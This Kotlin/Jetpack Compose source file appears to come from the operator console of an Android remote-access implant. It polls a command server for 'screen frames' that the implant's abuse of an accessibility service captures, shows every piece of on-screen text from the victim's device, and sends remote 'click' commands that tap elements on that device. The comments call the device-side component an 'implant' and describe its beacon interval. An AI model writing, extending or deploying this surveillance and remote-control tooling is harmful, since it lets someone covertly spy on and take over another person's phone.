package com.shadow.operator.ui.live

import androidx.compose.foundation.background
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.Card
import androidx.compose.material3.CardDefaults
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.DisposableEffect
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.rememberCoroutineScope
import androidx.compose.runtime.rememberUpdatedState
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.shadow.operator.data.RpcClient
import com.shadow.operator.ui.theme.AccentAmber
import com.shadow.operator.ui.theme.AccentGreen
import com.shadow.operator.ui.theme.AccentRed
import com.shadow.operator.ui.theme.TextPrimary
import com.shadow.operator.ui.theme.TextSecondary
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

// File-local palette, matching the rest of the operator.
private val PanelBg = Color(0xFF141A23)
private val TextDim = Color(0xFF8892A4)
private val Mono = FontFamily.Monospace

/**
 * Live semantic screen view.
 *
 * The implant re-projects the a11y node tree on a timer and pushes change-gated
 * frames down its existing event pipe; this screen just polls get_events and
 * renders the newest frame. get_events is answered by the Durable Object
 * directly, so polling is cheap and is NOT gated by the implant's ~25s beacon --
 * only the on/off command has to make that round trip.
 *
 * Not a screenshot: no pixels, no images, no canvas/WebView content. What it
 * does give you is the actual text on screen plus a tap target per node.
 */
@Composable
fun LiveScreen(rpc: RpcClient, onNavigateBack: () -> Unit) {
    val scope = rememberCoroutineScope()
    var streaming by remember { mutableStateOf(false) }
    var frame by remember { mutableStateOf<ScreenFrame?>(null) }
    var status by remember { mutableStateOf("") }
    var busy by remember { mutableStateOf(false) }
    var now by remember { mutableStateOf(System.currentTimeMillis()) }

    // Hoisted unconditionally. `remember` behind a conditional early-return lands
    // in a different group slot depending on which branch ran, which is exactly
    // the group-stack imbalance that crashes ComposerImpl.end() in Compose 1.6.
    val nodeScroll = rememberScrollState()

    val intervalMs = 1000
    val maxNodes = 150

    suspend fun setStream(on: Boolean): String =
        rpc.execute(
            "screen_stream",
            "{\"on\":$on,\"interval_ms\":$intervalMs,\"max_nodes\":$maxNodes}",
            180000,
        )

    // Poll the DO for the newest streamed frame. Cheap: this never waits on the
    // implant, only on the DO's own event table.
    LaunchedEffect(streaming) {
        while (streaming) {
            now = System.currentTimeMillis()
            try {
                val newest = rpc.getEvents()
                    .filter { it.data.startsWith("[SCREEN]") }
                    .maxByOrNull { it.ts }
                if (newest != null) {
                    parseScreen(newest.data, newest.ts)?.let { f ->
                        if (frame == null || f.at >= frame!!.at) frame = f
                    }
                }
            } catch (e: Throwable) {
                status = "poll: ${e.message}"
            }
            delay(1200)
        }
    }

    // Safety: never leave the implant streaming. A stream that outlives the
    // viewer is pure waste on the device and unbounded growth in the DO's event
    // table, so switching off is not optional.
    //
    // NOTE: this must NOT use rememberCoroutineScope() -- that scope is
    // cancelled as the composable leaves, so the "off" command would silently
    // never be sent and the implant would stream forever.
    val streamingNow by rememberUpdatedState(streaming)
    DisposableEffect(Unit) {
        onDispose {
            if (streamingNow) {
                CoroutineScope(Dispatchers.IO).launch {
                    runCatching { setStream(false) }
                }
            }
        }
    }

    Column(
        Modifier
            .fillMaxSize()
            .background(Color(0xFF0A0A0A))
            .padding(12.dp)
    ) {
        // ---- header ----
        Row(verticalAlignment = Alignment.CenterVertically) {
            Text(
                "←",
                color = AccentGreen,
                fontSize = 20.sp,
                fontWeight = FontWeight.Bold,
                modifier = Modifier
                    .clickable { onNavigateBack() }
                    .padding(end = 12.dp)
            )
            Column {
                Text("Live Screen", color = Color.White, fontWeight = FontWeight.SemiBold)
                Text(
                    "a11y node stream · ~${1000 / intervalMs}fps · no pixels",
                    color = TextDim,
                    fontSize = 11.sp
                )
            }
        }

        Spacer(Modifier.height(12.dp))

        // ---- control ----
        Card(
            colors = CardDefaults.cardColors(containerColor = PanelBg),
            shape = RoundedCornerShape(10.dp),
            modifier = Modifier.fillMaxWidth()
        ) {
            Column(Modifier.padding(12.dp)) {
                Row(
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.spacedBy(10.dp)
                ) {
                    Text(
                        if (busy) "…" else if (streaming) "STREAMING" else "IDLE",
                        color = if (streaming) AccentGreen else TextDim,
                        fontWeight = FontWeight.Bold,
                        fontSize = 12.sp
                    )
                    Spacer(Modifier.width(4.dp))
                    Text(
                        if (streaming) "■ stop" else "▶ start",
                        color = if (streaming) AccentRed else AccentGreen,
                        fontWeight = FontWeight.Bold,
                        modifier = Modifier.clickable(enabled = !busy) {
                            busy = true
                            scope.launch {
                                status = setStream(!streaming)
                                streaming = !streaming
                                busy = false
                            }
                        }
                    )
                }
                if (status.isNotBlank()) {
                    Spacer(Modifier.height(6.dp))
                    Text(status, color = TextDim, fontSize = 11.sp)
                }
                if (busy) {
                    Spacer(Modifier.height(4.dp))
                    Text(
                        "command is in flight — the beacon round trip is ~27s " +
                            "until the implant is running r7",
                        color = AccentAmber,
                        fontSize = 10.sp
                    )
                }
            }
        }

        Spacer(Modifier.height(12.dp))

        // ---- frame ----
        val f = frame
        if (f == null) {
            Text(
                if (streaming) "waiting for the first frame…" else "not streaming",
                color = TextDim,
                fontSize = 12.sp
            )
            return@Column
        }

        Row(
            Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.SpaceBetween
        ) {
            Text(f.pkg, color = AccentAmber, fontSize = 11.sp, fontFamily = Mono)
            Text(
                "${f.nodes.size} nodes · ${(now - f.at) / 1000}s ago",
                color = TextDim,
                fontSize = 11.sp
            )
        }

        if (f.nodes.isEmpty()) {
            Spacer(Modifier.height(8.dp))
            Text(
                "no exposed nodes — canvas / WebView / game surface. " +
                    "the node tree is empty here; use a pixel capture instead.",
                color = TextDim,
                fontSize = 11.sp
            )
            return@Column
        }

        Spacer(Modifier.height(8.dp))

        Column(Modifier.verticalScroll(nodeScroll)) {
            f.nodes.forEach { n ->
                NodeRow(n) { target ->
                    scope.launch {
                        status = "tap $target"
                        val out = rpc.execute(
                            "click",
                            "{\"text\":\"${target.replace("\\", "\\\\").replace("\"", "\\\"")}\"}",
                            180000,
                        )
                        status = out.take(160)
                    }
                }
            }
        }
    }
}

@Composable
private fun NodeRow(node: ScreenNode, onTap: (String) -> Unit) {
    val target = node.clickTarget
    Card(
        colors = CardDefaults.cardColors(containerColor = PanelBg),
        shape = RoundedCornerShape(8.dp),
        modifier = Modifier
            .fillMaxWidth()
            .padding(bottom = 6.dp)
    ) {
        Row(
            Modifier.padding(10.dp),
            verticalAlignment = Alignment.CenterVertically
        ) {
            Column(Modifier.weight(1f)) {
                val label = node.label
                Text(
                    if (label.isBlank()) "(empty)" else label,
                    color = if (label.isBlank()) TextDim else TextPrimary,
                    fontSize = 13.sp,
                    maxLines = 3
                )
                Spacer(Modifier.height(2.dp))
                Text(
                    buildString {
                        append(node.bounds)
                        if (node.id.isNotBlank()) append("  #").append(node.id)
                    },
                    color = TextDim,
                    fontSize = 10.sp,
                    fontFamily = Mono
                )
            }
            if (node.clickable && target != null) {
                Spacer(Modifier.width(8.dp))
                Text(
                    "TAP",
                    color = AccentGreen,
                    fontSize = 11.sp,
                    fontWeight = FontWeight.Bold,
                    modifier = Modifier
                        .clickable { onTap(target) }
                        .padding(6.dp)
                )
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Frame parsing
// ---------------------------------------------------------------------------

private data class ScreenNode(
    val bounds: String,
    val clickable: Boolean,
    val id: String,
    val text: String,
    val desc: String,
) {
    /** What the user sees. content-desc first: it is what a human reads. */
    val label: String get() = if (text.isNotBlank()) text else desc

    /**
     * What to send to the implant's `click`. Prefer the resource id -- text can
     * be ambiguous or change between frames, whereas `#id` is stable.
     */
    val clickTarget: String?
        get() = when {
            id.isNotBlank() -> "#$id"
            text.isNotBlank() -> text
            desc.isNotBlank() -> desc
            else -> null
        }
}

private data class ScreenFrame(
    val pkg: String,
    val nodes: List<ScreenNode>,
    val at: Long,
)

/**
 * Frame shape produced by ShadowAccessibilityService.pushScreenFrame:
 *   [SCREEN][<pkg>]
 *   <l>,<t>,<r>,<b>|<clickable 0/1>|<view-id>|<text>|<desc>
 */
private fun parseScreen(data: String, at: Long): ScreenFrame? {
    if (!data.startsWith("[SCREEN]")) return null
    val lines = data.split('\n')
    val pkg = lines.firstOrNull()
        ?.removePrefix("[SCREEN][")
        ?.removeSuffix("]")
        ?.trim()
        .orEmpty()
    val nodes = lines.drop(1).mapNotNull { line ->
        if (line.isBlank()) return@mapNotNull null
        val p = line.split('|')
        if (p.size < 5) return@mapNotNull null
        ScreenNode(
            bounds = p[0],
            clickable = p[1] == "1",
            id = p[2],
            text = p[3],
            desc = p[4],
        )
    }
    return ScreenFrame(pkg.ifBlank { "?" }, nodes, at)
}
